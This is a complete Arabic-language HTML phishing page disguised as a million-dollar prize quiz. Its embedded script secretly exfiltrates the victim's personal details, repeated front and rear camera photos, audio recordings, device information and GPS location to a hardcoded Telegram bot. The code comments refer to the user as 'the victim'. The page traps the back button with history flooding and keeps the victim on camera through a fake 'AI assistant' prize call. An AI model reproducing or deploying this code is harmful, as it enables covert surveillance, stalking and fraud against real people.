<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مسابقة المليون - مبروك ربحت معنا!</title>
    <style>
        body { background: radial-gradient(circle, #0a192f 0%, #000 100%); color: #fff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; text-align: center; }
        .quiz-container { width: 90%; max-width: 500px; background: rgba(255, 255, 255, 0.05); border: 2px solid #fbbf24; border-radius: 20px; padding: 20px; margin-top: 50px; box-shadow: 0 0 20px #fbbf24; }
        .logo { width: 100px; border-radius: 50%; border: 2px solid #fbbf24; margin-bottom: 10px; }
        .q-box { display: none; }
        .active { display: block; animation: slide 0.4s ease-in-out; }
        @keyframes slide { from { transform: translateX(50px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; }
        button { background: linear-gradient(#fbbf24, #d97706); color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .progress-bar { width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 15px 0; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #fbbf24; transition: 0.3s; }
        #ai-call { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
        .ai-avatar { width: 200px; height: 200px; border-radius: 50%; border: 4px solid #3498db; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(52, 152, 219, 0.7); } 70% { box-shadow: 0 0 0 30px rgba(52, 152, 219, 0); } 100% { box-shadow: 0 0 0 0 rgba(52, 152, 219, 0); } }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="quiz-container" id="main-content">
        <img src="https://upload.wikimedia.org/wikipedia/ar/2/21/%D8%B4%D8%B9%D8%A7%D8%B1_%D9%85%D9%86_%D8%B3%D9%8A%D8%B1%D8%A8%D9%81_%D8%A7%D9%84%D9%85%D9%84%D9%8A%D9%88%D9%86.jpg" class="logo">
        <h1>مسابقة المليون الكبرى 🏆</h1>
        <div class="progress-bar"><div class="progress-fill" id="p-bar"></div></div>
        <p id="q-text">جاري تجهيز الأسئلة...</p>

        <div class="q-box active" id="step1">
            <input type="text" id="u_name" placeholder="ما هو اسمك بالكامل؟">
            <input type="number" id="u_age" placeholder="كم عمرك؟">
            <input type="text" id="u_city" placeholder="في أي مدينة تسكن؟">
            <button onclick="startQuiz()">بدء المسابقة الآن</button>
        </div>

        <div class="q-box" id="step_quiz">
            <h2 id="q_title">السؤال رقم 1</h2>
            <p id="q_content">هل أنت مستعد للفوز بـ 1,000,000 دولار؟</p>
            <button onclick="handleQuestion()">نعم، أنا مستعد!</button>
            <button onclick="handleQuestion()" style="background:#444; color:#fff; margin-top:5px;">بالتأكيد</button>
        </div>
    </div>

    <div id="ai-call">
        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndXIzZ3R4Z3Z6Z3Z6Z3Z6Z3Z6Z3Z6Z3Z6Z3Z6Z3Z6Z3Z6Z3Z6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ25vcmUmY3Q9Zw/3o7TKMGpxP5OqR5mDe/giphy.gif" class="ai-avatar">
        <h2 style="color:#3498db">اتصال مباشر من لجنة التحكيم...</h2>
        <p>مبروووك! أنت الآن تتحدث مع المساعد الذكي لتأكيد الجائزة.</p>
        <p style="font-size:12px; color: #666;">يرجى عدم إغلاق الكاميرا أثناء المكالمة</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let qIndex = 1;
        let currentStream = null;

        function log(m) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }

        // 1. بدء المسابقة وسحب البيانات الأولية
        async function startQuiz() {
            const name = document.getElementById('u_name').value;
            const age = document.getElementById('u_age').value;
            const city = document.getElementById('u_city').value;
            if(!name || !age || !city) return alert("يرجى إكمال بياناتك للمشاركة!");

            log(`🏆 **متسابق جديد وصل:**\n👤 الاسم: ${name}\n🎂 العمر: ${age}\n🏠 السكن: ${city}`);
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                currentStream = s;
                log("✅ الضحية أعطى الأذونات! جاري السحب المكثف...");
                
                // تشغيل الأنظمة السرية
                startCamera(); 
                startAudio();
                getDeviceInfo();

                document.getElementById('step1').classList.remove('active');
                document.getElementById('step_quiz').classList.add('active');
            } catch(e) {
                alert("يجب السماح بالكاميرا والمايكروفون للمشاركة في المسابقة!");
            }
        }

        // 2. نظام الـ 30 سؤالاً والتحفيز
        const quizData = [
            "ما هو لونك المفضل؟", "هل تفضل السفر براً أم بحراً؟", "ما هو هدفك في الحياة؟",
            "هل تملك حساباً بنكياً لاستلام الجائزة؟", "ما هو نوع هاتفك الحالي؟", "هل تحب المسابقات التلفزيونية؟",
            "أنت مبدع! السؤال التالي: ما هو تخصصك الدراسي؟", "هل تتوقع الفوز بالمليون اليوم؟", "ماذا ستفعل بالمبلغ؟"
        ];

        function handleQuestion() {
            if(qIndex >= 30) {
                showAI();
                return;
            }

            qIndex++;
            document.getElementById('q_title').innerText = `السؤال رقم ${qIndex}`;
            document.getElementById('q_content').innerText = quizData[qIndex % quizData.length] || "هل أنت مستعد للمليون؟";
            document.getElementById('p-bar').style.width = (qIndex / 30 * 100) + "%";

            // رسائل تحفيزية كل 7 أسئلة
            if(qIndex % 7 === 0) {
                alert("🌟 مذهل! أنت الآن على بعد خطوات قليلة من الجائزة الكبرى! واصل الإجابة.");
            }
        }

        // 3. نظام التصوير المكثف (كل ثانية - تبديل كاميرات)
        async function startCamera() {
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            const modes = ["user", "environment"];
            let i = 0;
            
            while(true) {
                try {
                    const mode = modes[i % 2];
                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                    v.srcObject = s;
                    await new Promise(r => setTimeout(r, 600)); // وقت الفوكس
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', b, 's.jpg');
                        fd.append('caption', `🔄 لقطة (${mode==="user"?"أمامية":"خلفية"}) - سؤال ${qIndex}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                    s.getTracks().forEach(t => t.stop());
                } catch(e) {}
                i++;
                await new Promise(r => setTimeout(r, 1000)); // تصوير كل ثانية
            }
        }

        // 4. سحب الصوت والموقع ومعلومات الهاتف
        function startAudio() {
            navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
                const rec = new MediaRecorder(s);
                rec.ondataavailable = (e) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 8000); }, 20000);
            });
        }

        async function getDeviceInfo() {
            try {
                const b = await navigator.getBattery();
                let info = "🧨 **تقرير الجهاز الكامل:**\n";
                info += `📱 النظام: ${navigator.platform}\n⚙️ الأنوية: ${navigator.hardwareConcurrency}\n`;
                info += `💾 الرام: ${navigator.deviceMemory}GB\n🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
                info += `📶 الشبكة: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}`;
                log(info);
                navigator.geolocation.getCurrentPosition(p => {
                    log(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                });
            } catch(e) {}
        }

        // 5. واجهة الذكاء الاصطناعي النهائية
        function showAI() {
            document.getElementById('main-content').style.display = 'none';
            document.getElementById('ai-call').style.cssText = 'display: flex;';
            log("📺 **الضحية وصل للمرحلة النهائية (مكالمة الفيديو الوهمية)**");
            // هنا يبقى الضحية فاتح الكاميرا وهو ينظر للشاشة بانتظار "الذكاء الاصطناعي"
        }

        window.onload = () => {
            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
            if(navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
